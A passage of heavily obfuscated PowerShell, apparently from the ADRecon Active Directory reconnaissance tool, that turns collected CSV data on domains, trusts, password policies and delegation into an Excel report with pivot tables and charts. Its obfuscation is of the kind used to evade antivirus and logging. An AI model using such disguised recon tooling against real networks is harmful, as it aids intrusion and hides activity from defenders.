                Foreach ($prop in $_."P`sObjecT"."p`RopEr`TI`es")
                {
                    $worksheet."C`eLls".("{1}{0}" -f 'tem','I').Invoke($row, $column) = $prop."na`ME"
                    $worksheet."cEL`LS".("{0}{1}"-f'I','tem').Invoke($row, $column + 1) = $prop."vAL`UE"
                    $row++
                }
            }
            Remove-Variable ("{0}{1}"-f'AD','Temp')
            $listObject = $worksheet."listobJe`C`TS"."A`DD"( $7hze::"XlSr`CraN`gE", $worksheet."u`sEDRA`NgE", $null,   (  gET-CHiLDItEm ('vaRI'+'Ab'+'Le:'+'y'+'EZPB')  ).vAluE::"Xl`yEs", $null)
            $listObject."T`Ab`l`eSTYle" = ("{0}{3}{2}{1}"-f 'Tab','ght2','eStyleLi','l') 
            $usedRange = $worksheet."U`sE`DRANGe"
            $usedRange."E`N`TiREC`olUMN".("{0}{1}{2}"-f 'Auto','F','it').Invoke() | Out-Null
        }
        Else
        {
            $worksheet."ce`LlS".("{1}{0}" -f'em','It').Invoke($row, $column) = ("{0}{1}"-f 'Er','ror!')
        }
        Remove-Variable ("{0}{1}{3}{2}" -f'A','D','e','FileNam')
    }
    $excel."S`cREe`NUpD`ATiNG" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable ("{1}{2}{0}"-f'et','wor','kshe')
}


Function GeT-ad`Re`xce`lpIVOTtA`BLE
{

    param (
        [Parameter(mAnDAtOrY = $true)]
        [string] $SrcSheetName,

        [Parameter(MandATORy = $true)]
        [string] $PivotTableName,

        [Parameter(manDatORy = $false)]
        [array] $PivotRows,

        [Parameter(MANdATorY = $false)]
        [array] $PivotColumns,

        [Parameter(MANDatORY = $false)]
        [array] $PivotFilters,

        [Parameter(mANdATOrY = $false)]
        [array] $PivotValues,

        [Parameter(MaNDAtORY = $false)]
        [array] $PivotPercentage,

        [Parameter(MANdaToRy = $false)]
        [string] $PivotLocation = ("{0}{1}" -f 'R1','C1')
    )

    $excel."SCrEE`N`UPDAT`i`Ng" = $false
    $SrcWorksheet = $workbook."sh`eEtS".("{1}{0}" -f'em','It').Invoke($SrcSheetName)
    $workbook."sHoWpiv`o`TT`AbLefI`ElD`liST" = $false

    
    
    
    
    
    

    
    
    $PivotFailed = $false
    Try
    {
        $PivotCaches = $workbook.("{0}{2}{1}"-f 'PivotCac','es','h').Invoke()."c`RE`AtE"(  (  dIr VARIAbLe:k9W  ).vALUE::"X`LDaTA`BasE", $SrcWorksheet."usEdr`AN`gE",  (  VaRiABlE ('P1'+'6z3'+'8')).VAlue::"xlPIvo`TT`AbLEve`RsI`ON12")
    }
    Catch
    {
        $PivotFailed = $true
        Write-Verbose (("{4}{3}{0}{5}{1}{2}"-f'ivotCaches',').Create','] Failed','P','[','('))
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
    If ( $PivotFailed -eq $true )
    {
        $rows = $SrcWorksheet."UsED`RA`NGE"."R`owS"."c`ouNt"
        If ($SrcSheetName -eq ("{2}{0}{3}{1}" -f 'r','SPNs','Compute',' '))
        {
            $PivotCols = ("{0}{1}" -f 'A','1:C')
        }
        ElseIf ($SrcSheetName -eq ("{0}{2}{1}" -f 'Comp','rs','ute'))
        {
            $PivotCols = ("{1}{0}" -f':F','A1')
        }
        ElseIf ($SrcSheetName -eq ("{0}{1}"-f'Use','rs'))
        {
            $PivotCols = ("{1}{0}" -f':C','A1')
        }
        $UsedRange = $SrcWorksheet.("{1}{0}" -f 'ge','Ran').Invoke($PivotCols+$rows)
        $PivotCaches = $workbook.("{1}{2}{0}"-f 'es','P','ivotCach').Invoke()."C`ReATe"( (item VArIAbLe:k9w ).vaLUe::"X`ldATAB`AsE", $UsedRange,  $p16z38::"x`LPiVo`Tta`B`LeVErsioN12")
        Remove-Variable ("{1}{0}"-f'ws','ro')
	    Remove-Variable ("{2}{1}{0}" -f 'ols','votC','Pi')
        Remove-Variable ("{2}{0}{1}" -f 'ng','e','UsedRa')
    }
    Remove-Variable ("{2}{1}{0}"-f'Failed','ivot','P')
    $PivotTable = $PivotCaches.("{3}{0}{2}{4}{1}" -f'tePivo','ble','t','Crea','Ta').Invoke($PivotLocation,$PivotTableName)
    

    If ($PivotRows)
    {
        ForEach ($Row in $PivotRows)
        {
            $PivotField = $PivotTable.("{1}{2}{0}{3}" -f 'Fiel','Pivo','t','ds').Invoke($Row)
            $PivotField."O`RIENt`AtiON" =   $AbIeJU::"x`l`ROwfIeLd"
        }
    }

    If ($PivotColumns)
    {
        ForEach ($Col in $PivotColumns)
        {
            $PivotField = $PivotTable.("{0}{2}{1}{3}"-f'Pi','iel','votF','ds').Invoke($Col)
            $PivotField."OrI`ENT`AtION" =   $AbiEju::"X`LC`OlUMNf`IELd"
        }
    }

    If ($PivotFilters)
    {
        ForEach ($Fil in $PivotFilters)
        {
            $PivotField = $PivotTable.("{2}{1}{0}"-f's','Field','Pivot').Invoke($Fil)
            $PivotField."O`RIE`NtAT`iOn" =  ( itEm  VarIabLE:Abieju ).VaLue::"X`lpAgE`F`iELd"
        }
    }

    If ($PivotValues)
    {
        ForEach ($Val in $PivotValues)
        {
            $PivotField = $PivotTable.("{1}{2}{0}{3}"-f'd','PivotF','iel','s').Invoke($Val)
            $PivotField."oRI`enTatI`oN" =  (GEt-VAriABLE  AbIEJu  ).VaLuE::"xL`daTA`FIeld"
        }
    }

    If ($PivotPercentage)
    {
        ForEach ($Val in $PivotPercentage)
        {
            $PivotField = $PivotTable.("{1}{2}{0}" -f'lds','Pivot','Fie').Invoke($Val)
            $PivotField."OrIe`Ntat`i`ON" =  (  gEt-chIlDITem VArIablE:AbiEJU ).vALUe::"X`LDA`T`AfiEld"
            $PivotField."CALCu`l`AtION" =  (  vaRIAblE  5IlU ).vALUE::"xLPE`R`CE`NtOFtOtal"
            $PivotTable."showv`A`lu`esroW" = $false
        }
    }

    
    $excel."sCReE`Nu`p`DATiNG" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotField
    Remove-Variable ("{2}{0}{1}"-f 'e','ld','PivotFi')
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTable
    Remove-Variable ("{2}{1}{0}" -f'tTable','o','Piv')
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotCaches
    Remove-Variable ("{0}{3}{2}{1}"-f 'Pivot','s','he','Cac')
    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable ("{3}{0}{2}{1}" -f 'cWor','eet','ksh','Sr')
}

Function GEt`-`A`drex`ceLAt`T`RiBUt`es`TaTs
{

    param (
        [Parameter(manDATory = $true)]
        [string] $SrcSheetName,

        [Parameter(MaNdaTOrY = $true)]
        [string] $Title1,

        [Parameter(manDATory = $true)]
        [string] $PivotTableName,

        [Parameter(mandaTorY = $true)]
        [string] $PivotRows,

        [Parameter(MaNdatoRy = $true)]
        [string] $PivotValues,

        [Parameter(mAnDatOry = $true)]
        [string] $PivotPercentage,

        [Parameter(MAnDAtoRy = $true)]
        [string] $Title2,

        [Parameter(MAndAtOrY = $true)]
        [System.Object] $ObjAttributes
    )

    $excel."SC`R`ee`NUP`DAtINg" = $false
    $worksheet = $workbook."wor`KsheE`Ts".("{1}{0}"-f'm','Ite').Invoke(1)
    $SrcWorksheet = $workbook."S`h`eETs".("{0}{1}" -f 'It','em').Invoke($SrcSheetName)

    $row = 1
    $column = 1
    $worksheet."CEL`ls".("{1}{0}" -f'm','Ite').Invoke($row, $column) = $Title1
    $worksheet."CEL`lS".("{0}{1}" -f 'It','em').Invoke($row,$column)."sty`lE" = ("{0}{1}{2}"-f'Hea','di','ng 2')
    $worksheet."ce`lls".("{0}{1}"-f 'I','tem').Invoke($row,$column)."HOr`IZ`O`NtalALiG`NmE`NT" = -4108
    $MergeCells = $worksheet.("{1}{0}"-f 'nge','Ra').Invoke(("{1}{0}" -f '1:C1','A'))
    $MergeCells.("{1}{0}"-f 'lect','Se').Invoke() | Out-Null
    $MergeCells."me`RgeC`E`lls" = $true
    Remove-Variable ("{2}{0}{1}"-f'Cel','ls','Merge')

    Get-ADRExcelPivotTable -SrcSheetName $SrcSheetName -PivotTableName $PivotTableName -PivotRows @($PivotRows) -PivotValues @($PivotValues) -PivotPercentage @($PivotPercentage) -PivotLocation ("{1}{0}"-f'C1','R2')
    $excel."sC`ReEnuP`DA`TINg" = $false

    $row = 2
    ("{0}{1}" -f'Ty','pe'),("{1}{0}"-f 't','Coun'),("{3}{0}{2}{1}"-f 'ent','ge','a','Perc') | ForEach-Object {
        $worksheet."ce`LlS".("{0}{1}"-f'It','em').Invoke($row, $column) = $_
        $worksheet."CE`lLS".("{0}{1}"-f'I','tem').Invoke($row, $column)."f`oNt"."b`oLD" = $True
        $column++
    }

    $row = 3
    $column = 1
    For($row = 3; $row -le 6; $row++)
    {
        $temptext = [string] $worksheet."C`eLLs".("{1}{0}" -f 'm','Ite').Invoke($row, $column)."T`Ext"
        switch ($temptext.("{0}{1}" -f 'T','oUpper').Invoke())
        {
            ("{0}{1}"-f'TR','UE') { $worksheet."C`ELls".("{0}{1}"-f'It','em').Invoke($row, $column) = ("{2}{1}{0}"-f'd','le','Enab') }
            ("{0}{1}" -f'F','ALSE') { $worksheet."c`ElLS".("{0}{1}"-f'It','em').Invoke($row, $column) = ("{0}{2}{1}"-f'D','bled','isa') }
            ("{3}{0}{2}{1}" -f ' T','TAL','O','GRAND') { $worksheet."CeL`LS".("{1}{0}" -f 'm','Ite').Invoke($row, $column) = ("{1}{0}"-f 'tal','To') }
        }
    }

    If ($ObjAttributes)
    {
        $row = 1
        $column = 6
        $worksheet."c`eLls".("{1}{0}" -f 'em','It').Invoke($row, $column) = $Title2
        $worksheet."cel`lS".("{0}{1}"-f'It','em').Invoke($row,$column)."s`TYLE" = ("{2}{1}{0}"-f'2','ading ','He')
        $worksheet."cel`Ls".("{0}{1}"-f'Ite','m').Invoke($row,$column)."hORiZONTALA`l`I`GNME`NT" = -4108
        $MergeCells = $worksheet.("{0}{1}" -f 'R','ange').Invoke(("{1}{0}" -f'1','F1:L'))
        $MergeCells.("{1}{0}{2}"-f'l','Se','ect').Invoke() | Out-Null
        $MergeCells."m`E`RGecELLs" = $true
        Remove-Variable ("{1}{0}{2}" -f'eCe','Merg','lls')

        $row++
        ("{1}{2}{0}"-f'ry','Categ','o'),("{3}{2}{0}{1}"-f'd C','ount','le','Enab'),("{0}{4}{3}{1}{2}"-f 'Enabled','g','e','ta',' Percen'),("{1}{0}{2}{3}" -f'sa','Di','bled Co','unt'),("{0}{3}{2}{1}{4}"-f'Di','Perce','ed ','sabl','ntage'),("{3}{2}{0}{1}"-f 'oun','t',' C','Total'),("{1}{0}{3}{2}" -f 'tal P','To','ntage','erce') | ForEach-Object {
            $worksheet."ce`lLs".("{1}{0}"-f 'tem','I').Invoke($row, $column) = $_
            $worksheet."CE`llS".("{1}{0}" -f 'em','It').Invoke($row, $column)."FO`Nt"."B`olD" = $True
            $column++
        }
        $ExcelColumn = ($SrcWorksheet."coL`Umns".("{1}{0}"-f 'ind','F').Invoke(("{0}{1}{2}"-f 'Ena','b','led')))
        $EnabledColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        $column = 6
        $i = 2

        $ObjAttributes."k`Eys" | ForEach-Object {
            $ExcelColumn = ($SrcWorksheet."C`oluM`Ns".("{0}{1}"-f 'F','ind').Invoke($_))
            $ColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
            $row++
            $i++
            If ($_ -eq ("{3}{2}{0}{4}{1}"-f 'legati','p','e','D','on Ty'))
            {
                $worksheet."c`EllS".("{0}{1}" -f 'It','em').Invoke($row, $column) = ("{1}{0}{2}{3}{5}{4}"-f 'nconstra','U','in','e','ation','d Deleg')
            }
            ElseIf ($_ -eq ("{2}{0}{1}{3}" -f 'on',' Ty','Delegati','pe'))
            {
                $worksheet."c`ElLs".("{0}{1}"-f 'I','tem').Invoke($row, $column) = ("{3}{5}{1}{0}{4}{2}"-f'rained Dele','t','on','C','gati','ons')
            }
            Else
            {
                $worksheet."ceL`lS".("{0}{1}"-f'I','tem').Invoke($row, $column)."F`orM`ULA" = "='" + $SrcWorksheet."N`AMe" + "'!" + $ExcelColumn.("{0}{2}{1}" -f 'A','ress','dd').Invoke($false,$false)
            }
            $worksheet."Ce`llS".("{0}{1}"-f 'It','em').Invoke($row, $column+1)."f`o`RmulA" = (((("{0}{2}{1}" -f'=CO','IFS(xfY','UNT'))  -CrEPlACE  'xfY',[ChaR]39)) + $SrcWorksheet."na`ME" + "'!" + $EnabledColAddress + ((("{2}{3}{1}{4}{0}"-f'rj5,','U',',','rj5TR','E'))."R`E`plACe"('rj5',[STRING][cHAr]34)) + "'" + $SrcWorksheet."nA`Me" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet."cel`lS".("{1}{0}" -f'em','It').Invoke($row, $column+2)."FOR`mu`lA" = ((("{1}{3}{0}{2}"-f '(','=IF','G','ERROR'))) + $i + (((("{6}{2}{8}{3}{1}{4}{7}{9}{0}{5}"-f'6,2,FALSE','ble','V','({0}Ena','d','),0)','/','{','LOOKUP','0},A3:B'))  -F  [chaR]34))
            $worksheet."CEl`Ls".("{1}{0}" -f'em','It').Invoke($row, $column+3)."FORmu`lA" = (((("{2}{0}{1}{3}" -f 'COUNTIFS(','{','=','0}')) -f[CHAr]39)) + $SrcWorksheet."na`mE" + "'!" + $EnabledColAddress + ((("{0}{1}" -f ',{0}F','ALSE{0},'))  -F[ChAR]34) + "'" + $SrcWorksheet."n`AmE" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet."cE`lLs".("{0}{1}" -f'It','em').Invoke($row, $column+4)."FO`Rm`ULA" = ((("{2}{0}{1}"-f 'O','R(I','=IFERR'))) + $i + (((("{2}{1}{6}{12}{0}{4}{10}{5}{8}{11}{9}{7}{3}" -f 'ed{','U','/VLOOK','0)','0},','3:B','P({0}','),','6,','E','A','2,FALS','Disabl'))-F[cHar]34))
            If ( ($_ -eq ("{1}{2}{0}{3}"-f 'r','SIDHist','o','y')) -or ($_ -eq ("{1}{2}{0}{3}{4}"-f 'to','ms-ds','-Crea','rSi','d')) )
            {
                
                $worksheet."cE`LlS".("{0}{1}"-f'I','tem').Invoke($row, $column+5)."FO`RMU`La" = (((("{0}{1}{2}"-f'=COU','NT','IF({0}')) -f  [chAr]39)) + $SrcWorksheet."na`mE" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')-1'
            }
            Else
            {
                $worksheet."c`ELlS".("{0}{1}" -f 'Ite','m').Invoke($row, $column+5)."f`O`RMUlA" = ((("{3}{2}{0}{1}{4}"-f'TI','F','COUN','=','(8B7'))."R`EPlA`ce"(([cHaR]56+[cHaR]66+[cHaR]55),[strIng][cHaR]39)) + $SrcWorksheet."N`AmE" + "'!" + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            }
            $worksheet."CEL`LS".("{0}{1}" -f'Ite','m').Invoke($row, $column+6)."FO`RM`UlA" = ((("{2}{0}{1}{3}" -f 'R','RO','=IFE','R(K'))) + $i + (((("{2}{3}{5}{1}{7}{6}{4}{0}"-f ')','3:B6,2,FALS','/VL','O','0','OKUP(2UGTotal2UG,A','),','E'))  -CREpLacE '2UG',[ChAR]34))
        }

        
        "H", "J" , "L" | ForEach-Object {
            $rng = $_ + $($row - $ObjAttributes."co`Unt" + 1) + ":" + $_ + $($row)
            $worksheet.("{0}{1}" -f'Ran','ge').Invoke($rng)."nu`mb`e`RFoRMaT" = ("{0}{1}"-f'0.','00%')
        }
    }
    $excel."SCr`ee`NUPDAtI`Ng" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable ("{3}{0}{2}{1}"-f'rksh','et','e','SrcWo')
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable ("{2}{3}{1}{0}"-f't','hee','wo','rks')
}

Function G`ET`-adRex`ceLcHaRT
{

    param (
        [Parameter(manDatoRy = $true)]
        [string] $ChartType,

        [Parameter(mandaTory = $true)]
        [int] $ChartLayout,

        [Parameter(MAndATORY = $true)]
        [string] $ChartTitle,

        [Parameter(mandATORY = $true)]
        $RangetoCover,

        [Parameter(mANdatORY = $false)]
        $ChartData = $null,

        [Parameter(mANdatORy = $false)]
        $StartRow = $null,

        [Parameter(MAndAToRy = $false)]
        $StartColumn = $null
    )

    $excel."scrEEnu`PD`ATi`NG" = $false
    $excel."DISPlA`y`AlERts" = $false
    $worksheet = $workbook."wORKs`H`E`eTs".("{1}{0}" -f'em','It').Invoke(1)
    $chart = $worksheet."Sh`APES".("{1}{2}{0}" -f 'hart','A','ddC').Invoke()."cha`Rt"
    
    $chart."cHaRt`T`yPE" = [int](  (  vArIAbLE  ('7S'+'Hn')  -valU)::$ChartType)
    $chart.("{2}{1}{0}"-f'ut','lyLayo','App').Invoke($ChartLayout)
    If ($null -eq $ChartData)
    {
        If ($null -eq $StartRow)
        {
            $start = $worksheet.("{1}{0}" -f 'ange','R').Invoke("A1")
        }
        Else
        {
            $start = $worksheet.("{0}{1}" -f'Ra','nge').Invoke($StartRow)
        }
        
        $X = $worksheet."RAN`Ge"($start,$start."e`Nd"(  $KfmO::"xLd`own"))
        If ($null -eq $StartColumn)
        {
            $start = $worksheet.("{0}{1}"-f 'Ra','nge').Invoke("B1")
        }
        Else
        {
            $start = $worksheet.("{1}{0}" -f 'e','Rang').Invoke($StartColumn)
        }
        
        $Y = $worksheet."Ran`ge"($start,$start."E`Nd"(  ( GEt-vARIaBlE kFmO  -vAl)::"xL`DoWN"))
        $ChartData = $worksheet.("{0}{1}" -f 'R','ange').Invoke($X,$Y)

        Get-ADRExcelComObjRelease -ComObjtoRelease $X
        Remove-Variable ('X')
        Get-ADRExcelComObjRelease -ComObjtoRelease $Y
        Remove-Variable ('Y')
        Get-ADRExcelComObjRelease -ComObjtoRelease $start
        Remove-Variable ("{0}{1}" -f 'sta','rt')
    }
    $chart.("{2}{0}{1}" -f 'ceDa','ta','SetSour').Invoke($ChartData)
    
    $chart."Pl`Otby" =   $3wscV::"x`lColU`mNs"
    $chart.("{1}{2}{0}{3}" -f'sC','s','erie','ollection').Invoke(1).("{0}{1}"-f'S','elect').Invoke() | Out-Null
    $chart.("{2}{4}{1}{0}{3}"-f'ollecti','C','Ser','on','ies').Invoke(1).("{4}{2}{3}{1}{0}" -f 'els','b','plyData','La','Ap').Invoke() | out-Null
    
    $chart."HasT`i`TlE" = $True
    $chart."ch`ArTT`iTlE"."t`EXT" = $ChartTitle
    
    $temp = $worksheet.("{1}{0}" -f'ange','R').Invoke($RangetoCover)
    
    $chart."ParE`Nt"."t`OP" = $temp."t`oP"
    $chart."Par`ENT"."L`efT" = $temp."l`efT"
    $chart."p`AR`ENT"."W`idTh" = $temp."Wid`Th"
    If ($ChartTitle -ne ("{2}{1}{4}{5}{6}{0}{3}"-f 'ps in A','ed','Privileg','D',' G','r','ou'))
    {
        $chart."p`Arent"."h`eIGhT" = $temp."H`Ei`gHT"
    }
    
    $excel."sCr`Een`UpDaTiNG" = $true
    $excel."d`i`splAYAlEr`Ts" = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $chart
    Remove-Variable ("{1}{0}" -f 'hart','c')
    Get-ADRExcelComObjRelease -ComObjtoRelease $ChartData
    Remove-Variable ("{1}{0}"-f'hartData','C')
    Get-ADRExcelComObjRelease -ComObjtoRelease $temp
    Remove-Variable ("{1}{0}" -f 'mp','te')
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable ("{2}{0}{1}"-f'or','ksheet','w')
}

Function Get`-`AdReX`CELso`Rt
{

    param (
        [Parameter(MANDaTOrY = $true)]
        [string] $ColumnName
    )

    $worksheet = $workbook."wo`Rk`SHeetS".("{1}{0}"-f 'em','It').Invoke(1)
    $worksheet.("{1}{2}{0}" -f 'vate','Ac','ti').Invoke();

    $ExcelColumn = ($worksheet."cOL`U`mnS".("{1}{0}" -f'ind','F').Invoke($ColumnName))
    If ($ExcelColumn)
    {
        If ($ExcelColumn."T`eXt" -ne $ColumnName)
        {
            $BeginAddress = $ExcelColumn.("{0}{1}{2}"-f'Ad','dre','ss').Invoke(0,0,1,1)
            $End = $False
            Do {
                
                $ExcelColumn = ($worksheet."C`oLuMns".("{0}{1}{2}" -f'Fi','ndNex','t').Invoke($ExcelColumn))
                $Address = $ExcelColumn.("{2}{0}{1}" -f 's','s','Addre').Invoke(0,0,1,1)
                If ( ($Address -eq $BeginAddress) -or ($ExcelColumn."T`eXT" -eq $ColumnName) )
                {
                    $End = $True
                }
            } Until ($End -eq $True)
        }
        If ($ExcelColumn."t`Ext" -eq $ColumnName)
        {
            
            $workSheet."LI`StoBJ`EC`TS".("{1}{0}" -f 'm','Ite').Invoke(1)."SO`Rt"."So`RtfiE`lDs".("{1}{0}" -f 'lear','C').Invoke()
            $workSheet."li`STobJ`eCts".("{1}{0}"-f 'tem','I').Invoke(1)."s`ORt"."SOr`TF`IElds".("{0}{1}"-f'A','dd').Invoke($ExcelColumn) | Out-Null
            $worksheet."LIST`ob`jE`cTs".("{0}{1}" -f 'It','em').Invoke(1)."So`Rt".("{1}{0}"-f'y','Appl').Invoke()
        }
        Else
        {
            Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
        }
    }
    Else
    {
        Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable ("{1}{2}{0}"-f'eet','works','h')
}

Function exPo`R`T-adr`excEL
{

    param(
        [Parameter(mandaTORy = $true)]
        [string] $ExcelPath
    )

    $ExcelPath = $((Convert-Path $ExcelPath).("{1}{0}"-f'End','Trim').Invoke("\"))
    $ReportPath = -join($ExcelPath,'\',("{1}{2}{0}" -f 'es','CSV','-Fil'))
    If (!(Test-Path $ReportPath))
    {
        Write-Warning ("{0}{1}{3}{4}{6}{8}{11}{2}{9}{5}{10}{7}"-f '[E','xport-ADREx','e CS','cel] ','Cou',' directory ','ld no','ing','t','V-Files','... Exit',' locate th')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    Get-ADRExcelComObj
    If ($excel)
    {
        Write-Output ("{3}{4}{6}{2}{5}{1}{0}"-f'lsx','Report.x','ec','[*] G','enerati','on-','ng ADR')

        $ADFileName = -join($ReportPath,'\',("{1}{0}{2}{3}"-f 'tADRec','Abou','on.c','sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{0}{3}{1}{2}" -f'AD','Nam','e','File')

            $workbook."W`ORk`sHEets".("{1}{0}"-f'em','It').Invoke(1)."nA`ME" = ("{2}{4}{3}{0}{1}"-f ' ADRec','on','A','out','b')
            $workbook."woRk`s`heeTs".("{0}{1}" -f'It','em').Invoke(1)."hyP`e`RL`INkS".("{1}{0}"-f 'd','Ad').Invoke($workbook."w`oRKs`heETs".("{0}{1}" -f 'It','em').Invoke(1)."cE`Lls".("{0}{1}"-f'Ite','m').Invoke(3,2) , ("{1}{2}{0}{5}{7}{4}{3}{6}"-f'://git','http','s','ADRec','adrecon/','hub.com','on','/'), "" , "", ("{7}{1}{2}{6}{4}{0}{5}{3}"-f '/adre','h','ub.c','n','m','con/ADReco','o','git')) | Out-Null
            $workbook."W`oR`k`sHeEts".("{0}{1}" -f'I','tem').Invoke(1)."U`S`edRAnge"."e`N`TIrE`colUMN".("{0}{2}{1}" -f 'Aut','t','oFi').Invoke() | Out-Null
        }

        $ADFileName = -join($ReportPath,'\',("{2}{0}{1}"-f 'est','.csv','For'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'Fore','st')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{3}{1}{2}{0}" -f'Name','i','le','ADF')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{0}{1}{2}" -f 'in.','c','sv','Doma'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}"-f 'D','omain')
            Get-ADRExcelImport -ADFileName $ADFileName
            $DomainObj = Import-CSV -Path $ADFileName
            Remove-Variable ("{2}{1}{0}"-f 'Name','DFile','A')
            $DomainName = -join($DomainObj[0]."Val`UE","-")
            Remove-Variable ("{2}{1}{0}" -f'Obj','in','Doma')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{2}{0}{1}" -f's.c','sv','t','Trus'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f'Trus','ts')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{0}{2}" -f 'il','ADF','eName')
        }

        $ADFileName = -join($ReportPath,'\',("{3}{2}{1}{0}"-f'sv','nets.c','ub','S'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{1}" -f 'Subnet','s')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{0}{2}{1}"-f 'A','eName','DFil')
        }

        $ADFileName = -join($ReportPath,'\',("{0}{2}{1}"-f'Sites','sv','.c'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{1}{0}"-f's','Site')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{0}{2}"-f 'DFil','A','eName')
        }

        $ADFileName = -join($ReportPath,'\',("{2}{3}{1}{0}{4}" -f'ory','st','Schem','aHi','.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{2}{0}{3}{1}" -f'chema','istory','S','H')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{1}{0}" -f'e','eNam','ADFil')
        }

        $ADFileName = -join($ReportPath,'\',("{1}{0}{3}{5}{4}{2}{6}" -f'r','FineG','w','a','nedPass','i','ordPolicy.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{5}{1}{7}{2}{6}{3}{0}{4}{8}" -f ' P','i',' ','ined','asswo','F','Gra','ne','rd Policy')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{1}{0}{2}{3}" -f 'i','ADF','le','Name')
        }

        $ADFileName = -join($ReportPath,'\',("{5}{2}{0}{3}{4}{6}{1}"-f 'tPass','v','l','wordP','o','Defau','licy.cs'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ("{0}{5}{7}{2}{6}{1}{4}{3}" -f'Def','ord','ass','licy',' Po','ault','w',' P')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ("{2}{0}{1}" -f'ileNam','e','ADF')

            $excel."S`cRe`e`NUP`DatInG" = $false
            $worksheet = $workbook."WORKs`H`ee`Ts".("{1}{0}"-f'tem','I').Invoke(1)
            
            $worksheet.("{0}{1}" -f 'R','ange').Invoke(("{0}{1}"-f'B2:G','10'))."H`OrizoNTaLAlIG`NME`NT" = -4108
            

            ("{0}{1}"-f 'A','2:B10'), ("{0}{2}{1}" -f'C','D10','2:'), ("{1}{2}{0}"-f'0','E2:','F1'), ("{0}{1}" -f'G2:G1','0') | ForEach-Object {
                $worksheet.("{1}{0}" -f 'nge','Ra').Invoke($_).("{2}{1}{0}"-f'rAround','rde','Bo').Invoke(1) | Out-Null
            }

            
            
            
            

            $ObjValues = @(
            
            "C2", ("{3}{2}{5}{4}{1}{0}{6}"-f'S',' FAL','IF(B','=','UE,','2<4,TR','E)')

            
            "C3", ("{5}{6}{3}{8}{1}{2}{0}{4}{7}"-f 'F','E,',' ','R(B3=0,B3>90)','ALS','=IF(','O','E)',',TRU')

            

            
            "C5", ("{1}{5}{2}{0}{3}{4}"-f'7,TRUE,','=','F(B5<',' ','FALSE)','I')

            
            "C6", (("{6}{7}{4}{0}{5}{3}{2}{1}"-f ',','ALSE)',' F',',','E','TRUE','=IF','(B6<>TRU'))

            

            
            "C8", ("{5}{3}{1}{6}{4}{0}{2}" -f 'E, ','ND(B8>=1,B8','FALSE)','A','TRU','=IF(','<30),')

            
            "C9", (("{4}{2}{0}{1}{3}"-f'9=0,B9>6),TRUE,',' FALSE','F(OR(B',')','=I'))

            

            
            "E2", (("{0}{3}{4}{2}{1}" -f'=IF',', FALSE)','TRUE','(B2','<8,'))

            
            "E3", ("{0}{4}{2}{6}{1}{5}{3}" -f '=IF(OR(',', F','0,B3>90),TR','E)','B3=','ALS','UE')

            
            "E4", (("{2}{1}{3}{4}{0}"-f ' FALSE)','0','=IF(B4=',',TRUE',','))

            
            "E5", ("{0}{1}{3}{2}"-f '=IF(B5','<13,TR',', FALSE)','UE')

            
            "E6", (("{5}{4}{3}{1}{2}{0}" -f'E)',' FAL','S',',TRUE,','TRUE','=IF(B6<>'))

            

            

            
            "E9", ((("{3}{8}{7}{4}{2}{0}{6}{1}{5}"-f '5),TRU',' FA','=0,B9>','=','B9','LSE)','E,','(','IF(OR')))

            

            
            "G2", (("{5}{2}{0}{3}{1}{4}"-f'T','FA','<24,','RUE, ','LSE)','=IF(B2'))

            
            "G3", ((("{4}{1}{3}{5}{2}{6}{0}" -f'E)','3=0,B3>60),TRU','AL','E, ','=IF(OR(B','F','S')))

            
            "G4", (("{2}{3}{0}{1}" -f 'B4=0,TRUE, FAL','SE)','=','IF('))

            
